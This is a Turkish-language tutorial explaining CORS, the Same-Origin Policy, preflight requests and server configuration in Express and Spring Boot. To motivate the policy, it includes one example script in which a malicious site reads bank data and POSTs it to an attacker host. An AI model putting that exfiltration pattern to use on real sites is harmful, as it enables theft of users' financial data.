# CORS (Cross-Origin Resource Sharing)

## Origin (Kaynak) Nedir?

CORS'u anlamadan once "origin" kavramini bilmek gerekir. Bir URL'nin origin'i uc parcadan olusur:

```
https://example.com:443/api/users
  |         |         |
protokol   domain    port
```

Iki URL'nin origin'i **ayni** sayilmasi icin bu ucunun de esit olmasi gerekir:

| URL A                        | URL B                        | Ayni Origin mi? | Neden                  |
| ---------------------------- | ---------------------------- | ---------------- | ---------------------- |
| `https://site.com`           | `https://site.com/api`       | Evet             | Yol farki origin'i degistirmez |
| `https://site.com`           | `http://site.com`            | Hayir            | Protokol farkli        |
| `https://site.com`           | `https://api.site.com`       | Hayir            | Subdomain farkli       |
| `https://site.com:443`       | `https://site.com:8080`      | Hayir            | Port farkli            |

---

## Same-Origin Policy (Ayni Kaynak Politikasi)

Tarayicilar varsayilan olarak **Same-Origin Policy** uygular. Bu politikaya gore bir sayfadaki JavaScript kodu **yalnizca kendi origin'ine** istek atabilir.

### Neden boyle bir kisitlama var?

Soyle bir senaryo dusun:

1. Bankaciligin icin `https://banka.com` adresine giris yaptin, oturum cookie'n tarayicida kayitli.
2. Baska bir sekmede zararli bir site actin: `https://kotu-site.com`.
3. Bu site arka planda sunucu kodunu calistiriyor:

```javascript
// kotu-site.com'daki zararli kod
fetch('https://banka.com/api/hesap-bilgileri')
  .then(res => res.json())
  .then(data => {
    // Senin banka bilgilerini kendi sunucusuna gonderiyor
    fetch('https://kotu-site.com/calinan-veri', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
```

Same-Origin Policy olmasaydi bu istek basarili olurdu cunku tarayici `banka.com`'a ait cookie'yi otomatik olarak gonderir. Politika sayesinde tarayici bu istegi **engeller**.

---

## CORS Ne Yapar?

Same-Origin Policy cok katı bir kural. Gercek uygulamalarda farkli origin'ler arasi iletisim gerekebilir:

- Frontend (`https://app.site.com`) ile Backend (`https://api.site.com`) ayri sunucularda
- Ucuncu parti API'ler kullaniliyor (harita servisi, odeme sistemi vs.)

CORS, sunucunun **"su origin'lerden gelen isteklere izin veriyorum"** demesini saglayan bir mekanizmadir. Kisitlamayi koyan tarayicidir, gevsetme yetkisi ise sunucunundur.

---

## CORS Nasil Calisir?

### 1. Basit Istekler (Simple Requests)

`GET`, `HEAD` veya `POST` (belirli content-type'larla) istekleri "basit istek" sayilir. Tarayici bunlari dogrudan gonderir ve cevaptaki header'lari kontrol eder:

```
Tarayici                          Sunucu
   |                                |
   |--- GET /api/users ------------>|
   |    Origin: https://app.com     |
   |                                |
   |<-- 200 OK --------------------|
   |    Access-Control-Allow-Origin:|
   |    https://app.com             |
   |                                |
```

Sunucu `Access-Control-Allow-Origin` header'inda istegi yapan origin'i dondururse tarayici cevabi JavaScript'e iletir. Dondurmezse tarayici cevabi **engeller**.

### 2. On-Kontrol Istekleri (Preflight Requests)

`PUT`, `DELETE`, ozel header iceren istekler gibi "basit olmayan" isteklerde tarayici once bir **OPTIONS** istegi gonderir:

```
Tarayici                                Sunucu
   |                                      |
   |--- OPTIONS /api/users -------------->|  (Preflight)
   |    Origin: https://app.com           |
   |    Access-Control-Request-Method:    |
   |    DELETE                            |
   |    Access-Control-Request-Headers:   |
   |    Authorization                     |
   |                                      |
   |<-- 204 No Content ------------------|
   |    Access-Control-Allow-Origin:      |
   |    https://app.com                   |
   |    Access-Control-Allow-Methods:     |
   |    GET, POST, DELETE                 |
   |    Access-Control-Allow-Headers:     |
   |    Authorization                     |
   |    Access-Control-Max-Age: 86400     |
   |                                      |
   |--- DELETE /api/users/5 ------------>|  (Asil istek)
   |    Origin: https://app.com           |
   |    Authorization: Bearer token123    |
   |                                      |
   |<-- 200 OK --------------------------|
   |    Access-Control-Allow-Origin:      |
   |    https://app.com                   |
```

`Access-Control-Max-Age` sayesinde tarayici preflight sonucunu onbellege alir ve her istekte tekrarlamaz.

---

## Onemli CORS Header'lari

### Sunucu Tarafindan Gonderilen (Response)

| Header                             | Aciklama                                          |
| ---------------------------------- | ------------------------------------------------- |
| `Access-Control-Allow-Origin`      | Hangi origin'lere izin verilecegi (`*` veya belirli origin) |
| `Access-Control-Allow-Methods`     | Izin verilen HTTP metodlari                       |
| `Access-Control-Allow-Headers`     | Izin verilen ozel header'lar                      |
| `Access-Control-Allow-Credentials` | Cookie gibi kimlik bilgilerinin gonderilip gonderilemeyecegi |
| `Access-Control-Max-Age`           | Preflight sonucunun kac saniye onbellekte tutulacagi |

### Tarayici Tarafindan Gonderilen (Request)

| Header                            | Aciklama                                    |
| --------------------------------- | ------------------------------------------- |
| `Origin`                          | Istegin yapildigi origin                    |
| `Access-Control-Request-Method`   | Preflight'ta kullanilacak metod             |
| `Access-Control-Request-Headers`  | Preflight'ta kullanilacak ozel header'lar   |

---

## Uygulama Ornekleri

### Express.js (Node.js)

```javascript
const express = require('express');
const cors = require('cors');
const app = express();

// Herkese acik API: tum origin'lere izin ver
app.use(cors());

// Belirli origin'lere izin ver (onerilen)
app.use(cors({
  origin: ['https://app.site.com', 'https://admin.site.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true   // Cookie gonderilmesine izin ver
}));
```

### Manuel Header ile (Herhangi bir backend)

```javascript
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', 'https://app.site.com');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Credentials', 'true');

  // Preflight isteklerine hizli cevap ver
  if (req.method === 'OPTIONS') {
    return res.sendStatus(204);
  }
  next();
});
```

### Spring Boot (Java)

```java
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
                .allowedOrigins("https://app.site.com")
                .allowedMethods("GET", "POST", "PUT", "DELETE")
                .allowedHeaders("*")
                .allowCredentials(true);
    }
}
```

---

## Sik Yapilan Hatalar

### 1. `Access-Control-Allow-Origin: *` ile `credentials: true` birlikte kullanilamaz

```javascript
// YANLIS: Tarayici bunu reddeder
res.setHeader('Access-Control-Allow-Origin', '*');
res.setHeader('Access-Control-Allow-Credentials', 'true');

// DOGRU: Belirli origin belirtilmeli
res.setHeader('Access-Control-Allow-Origin', 'https://app.site.com');
res.setHeader('Access-Control-Allow-Credentials', 'true');
```

### 2. CORS sunucu tarafinda cozulur, frontend'de degil

CORS hatasi aldiginda frontend kodunu degistirmek sorunu cozmez. Sunucu dogru header'lari dondurmeli.

### 3. Postman'de calisiyor ama tarayicida calismiyor

Postman bir tarayici degil, Same-Origin Policy uygulamaz. Bu yuzden Postman'de sorunsuz calisan istek tarayicida CORS hatasina neden olabilir.

---

## Gelistirme Ortaminda CORS

Frontend ve backend farkli portlarda calistiginda (ornegin React: 3000, API: 5000) CORS sorunuyla karsilasilir:

```javascript
// Frontend (http://localhost:3000)
fetch('http://localhost:5000/api/users')
// Hata: CORS policy tarafindan engellendi

// Cozum 1: Backend'e CORS ekle
app.use(cors({ origin: 'http://localhost:3000' }));

// Cozum 2: Frontend proxy kullan (package.json veya vite.config)
// package.json (React)
{ "proxy": "http://localhost:5000" }

// vite.config.js (Vite)
export default defineConfig({
  server: {
    proxy: {
      '/api': 'http://localhost:5000'
    }
  }
});
```

Proxy kullandiginda istek ayni origin'den geliyormus gibi gorunur, bu yuzden CORS sorunu ortadan kalkar.

---

## Ozet

```
Tarayici: "Bu farkli origin'e istek atabilir miyim?"
Sunucu:   "Access-Control-Allow-Origin header'i ile cevap verir"
Tarayici: "Header uygunsa istege izin veririm, degilse engellerim"
```

- **CORS bir guvenlik mekanizmasidir**, tarayici tarafindan uygulanir.
- **Kisitlamayi koyan tarayicidir**, cevapta izin veren ise sunucudur.
- **Basit isteklerde** dogrudan gonderilir, **karmasik isteklerde** once preflight (OPTIONS) yapilir.
- **Gelistirme ortaminda** proxy kullanmak CORS ayarina gerek kalmadan sorunu cozer.
- **Uretim ortaminda** sunucuda izin verilen origin'leri acikca belirtmek en guvenli yaklasimdir.
